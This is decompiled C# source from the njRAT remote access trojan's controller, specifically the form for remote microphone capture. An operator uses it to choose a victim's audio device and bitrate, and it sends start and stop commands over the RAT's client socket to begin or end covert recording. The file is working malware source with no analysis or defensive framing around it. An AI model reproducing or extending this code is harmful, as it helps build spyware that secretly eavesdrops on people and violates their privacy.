using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My.Resources;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x0200001A RID: 26
	[DesignerGenerated]
	public partial class Mic : Form
	{
		// Token: 0x060003FE RID: 1022 RVA: 0x0016A0D0 File Offset: 0x001684D0
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Mic.__ENCList;
			lock (_ENCList)
			{
				bool flag = Mic.__ENCList.Count == Mic.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Mic.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Mic.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Mic.__ENCList[num] = Mic.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Mic.__ENCList.RemoveRange(num, Mic.__ENCList.Count - num);
					Mic.__ENCList.Capacity = Mic.__ENCList.Count;
				}
				Mic.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000177 RID: 375
		// (get) Token: 0x06000401 RID: 1025 RVA: 0x0016A6E4 File Offset: 0x00168AE4
		// (set) Token: 0x06000402 RID: 1026 RVA: 0x0016A6FC File Offset: 0x00168AFC
		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		// Token: 0x17000178 RID: 376
		// (get) Token: 0x06000403 RID: 1027 RVA: 0x0016A708 File Offset: 0x00168B08
		// (set) Token: 0x06000404 RID: 1028 RVA: 0x0016A720 File Offset: 0x00168B20
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000179 RID: 377
		// (get) Token: 0x06000405 RID: 1029 RVA: 0x0016A780 File Offset: 0x00168B80
		// (set) Token: 0x06000406 RID: 1030 RVA: 0x0016A798 File Offset: 0x00168B98
		internal virtual Timer vmethod_4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.vmethod_4_Tick);
				bool flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick -= eventHandler;
				}
				this._vmethod_4 = value;
				flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick += eventHandler;
				}
			}
		}

		// Token: 0x1700017A RID: 378
		// (get) Token: 0x06000407 RID: 1031 RVA: 0x0016A7F8 File Offset: 0x00168BF8
		// (set) Token: 0x06000408 RID: 1032 RVA: 0x0016A810 File Offset: 0x00168C10
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x1700017B RID: 379
		// (get) Token: 0x06000409 RID: 1033 RVA: 0x0016A81C File Offset: 0x00168C1C
		// (set) Token: 0x0600040A RID: 1034 RVA: 0x0016A834 File Offset: 0x00168C34
		internal virtual ComboBox ComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox2 = value;
			}
		}

		// Token: 0x1700017C RID: 380
		// (get) Token: 0x0600040B RID: 1035 RVA: 0x0016A840 File Offset: 0x00168C40
		// (set) Token: 0x0600040C RID: 1036 RVA: 0x0016A858 File Offset: 0x00168C58
		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		// Token: 0x0600040D RID: 1037 RVA: 0x0016A864 File Offset: 0x00168C64
		public Mic()
		{
			base.FormClosing += this.Mic_FormClosing;
			base.Load += this.Mic_Load;
			Mic.__ENCAddToList(this);
			this.QQ = string.Empty;
			this.InitializeComponent();
		}

		// Token: 0x0600040E RID: 1038 RVA: 0x0016A8BC File Offset: 0x00168CBC
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Button1.Text, "Start", false) == 0;
			if (flag)
			{
				this.Button1.Text = "Stop";
				this.Button1.Image = NJRAT_Resources.control_pause_blue;
				this.ComboBox1.Enabled = false;
				this.ComboBox2.Enabled = false;
				int num = 0;
				flag = this.ComboBox2.Text.Contains("16bit");
				if (flag)
				{
					num = 1;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"~",
					Class7.string_1,
					this.ComboBox1.SelectedIndex.ToString(),
					Class7.string_1,
					Conversions.ToString((int)Math.Round(Math.Round(Conversions.ToDouble(this.ComboBox2.Text.Split(new char[] { ' ' })[0]) * 1024.0))),
					Class7.string_1,
					Conversions.ToString(num)
				}));
			}
			else
			{
				this.sk.Send("~" + Class7.string_1 + "-1");
				this.Button1.Image = NJRAT_Resources.control_play_blue;
				this.Button1.Text = "Start";
				this.ComboBox1.Enabled = true;
				this.ComboBox2.Enabled = true;
			}
		}

		// Token: 0x0600040F RID: 1039 RVA: 0x0016AA4C File Offset: 0x00168E4C
		private void Mic_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				bool cn = this.sk.CN;
				if (cn)
				{
					this.sk.Send("~" + Class7.string_1 + "-1");
				}
				this.sk.CN = false;
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000410 RID: 1040 RVA: 0x0016AACC File Offset: 0x00168ECC
		private void Mic_Load(object sender, EventArgs e)
		{
			try
			{
				this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
				this.Text = Class6.smethod_17(0L) + " " + this.QQ;
			}
			catch (Exception ex)
			{
			}
			bool flag = this.ComboBox1.Items.Count == 0;
			if (flag)
			{
				this.Close();
			}
			else
			{
				this.Button1.ImageAlign = ContentAlignment.MiddleLeft;
				this.Button1.Image = NJRAT_Resources.control_play_blue;
				this.ComboBox1.SelectedIndex = 0;
				flag = Class7.class8_0.int_1 > this.ComboBox2.Items.Count - 1;
				if (flag)
				{
					Class7.class8_0.int_1 = 0;
				}
				this.ComboBox2.SelectedIndex = Class7.class8_0.int_1;
				flag = Class7.class8_0.bool_8;
				if (flag)
				{
					this.Button1_Click(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
				}
			}
		}

		// Token: 0x06000411 RID: 1041 RVA: 0x0016AC08 File Offset: 0x00169008
		private void vmethod_4_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = (this.osk == null) | (this.sk == null);
				if (flag)
				{
					this.Close();
					return;
				}
				flag = !this.osk.CN | !this.sk.CN;
				if (flag)
				{
					this.Close();
				}
			}
			catch (Exception ex)
			{
			}
			this.ProgressBar1.Value = this.sk.rp();
		}

		// Token: 0x040001D6 RID: 470
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x040001D8 RID: 472
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		// Token: 0x040001D9 RID: 473
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x040001DA RID: 474
		[AccessedThroughProperty("vmethod_4")]
		private Timer _vmethod_4;

		// Token: 0x040001DB RID: 475
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x040001DC RID: 476
		[AccessedThroughProperty("ComboBox2")]
		private ComboBox _ComboBox2;

		// Token: 0x040001DD RID: 477
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		// Token: 0x040001DE RID: 478
		public Client osk;

		// Token: 0x040001DF RID: 479
		public string QQ;

		// Token: 0x040001E0 RID: 480
		public Client sk;
	}
}
